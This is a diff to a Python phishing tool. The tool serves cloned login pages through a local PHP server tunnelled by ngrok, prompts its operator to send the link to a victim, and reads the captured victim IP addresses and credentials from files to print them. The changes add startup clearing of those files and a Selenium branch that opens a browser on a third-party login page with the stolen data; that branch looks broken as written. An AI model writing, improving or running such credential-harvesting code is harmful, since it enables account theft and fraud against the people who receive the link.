@@ -1,7 +1,7 @@
 #!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
 import subprocess
 from sys import exit
-from src import termcolor
+from src.termcolor import colored
 import platform
 from zipfile import ZipFile
 from os import walk,path,getcwd
@@ -10,7 +10,8 @@ import threading
 from datetime import datetime
 import json
 from src import requests
-
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium import webdriver
     
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -49,6 +50,16 @@ start_ngrok = lambda : subprocess.Popen(['./ngrok','http', '3030'],stdin =subpro
 def start_php(server):
     subprocess.Popen(['php','-S', '127.0.0.1:3030','-t','sites/'+server],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
 
+def refresh():
+    if 1:
+        while 1:
+            for root, dirs, files in walk(getcwd()+'/sites/'):
+                for file in files:
+                    if file in ('ip.txt','redir.txt','victims.txt'):                        
+                        open(path.join(root, file),'w+')                        
+            else:
+                break
+
 def attack(server,url,wifi):
         
     t1 = threading.Thread(target=start_ngrok)
@@ -74,7 +85,7 @@ def attack(server,url,wifi):
     print()
     print(colored('[*] Send this link to victim  :  ','green',attrs=['bold'])+colored(link,'red',attrs=['bold']))
     print()
-    my_ip = get_my_ip()
+    my_ip = get_my_ip().strip(' ').strip('\n')
     if '/' not in server:
         ztop = 0
         print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
@@ -83,8 +94,8 @@ def attack(server,url,wifi):
                 for file in files:
                     if 'ip.txt' in file:
                         f = open(path.join(root, file))                    
-                        r = f.read()                    
-                        if '.' in r and r!=my_ip:
+                        r = f.read().strip(' ').strip('\n')
+                        if '.' in r and r not in my_ip:
                             f.seek(0)
                             print()
                             re=f.read()
@@ -108,15 +119,27 @@ def attack(server,url,wifi):
             for file in files:
                 if 'victims' in file:
                     f = open(path.join(root, file))                    
-                    if f.read():
-                        f.seek(0)
-                        cred = f.read().split('\n')[0]
-                        print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
-                        print(colored(cred,'green',attrs=['bold']))
-                        print()
-                        ztop = 1
-                        f.close()
-                        f = open(path.join(root, file),'w+')
+                    re = f.read()
+                    if re:
+                        if '<button' not in re:
+                            f.seek(0)
+                            cred = f.read().split('\n')[0]
+                            print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
+                            print(colored(cred,'green',attrs=['bold']))
+                            print()
+                            ztop = 1
+                            f.close()
+                            f = open(path.join(root, file),'w+')
+                        elif '<button' in re:                        
+                            f.seek(0)
+                            cred = f.read().split('\n')[0]
+                            print(colored('\n[*] Victim has logged in using another platform \n','yellow',attrs=['bold']))
+                            driver=webdriver.Chrome(executable_path=ChromeDriverManager().install())
+                            driver.get('https://www.instafollowerspro.com/login')
+                            driver.execute(cred)
+                            ztop = 1
+                            f.close()
+                            f = open(path.join(root, file),'w+')
                     f.close()                                            
         if ztop:
             break
@@ -302,5 +325,6 @@ def main():
 
 if __name__ == '__main__':
     
+    refresh()
     main() 
             
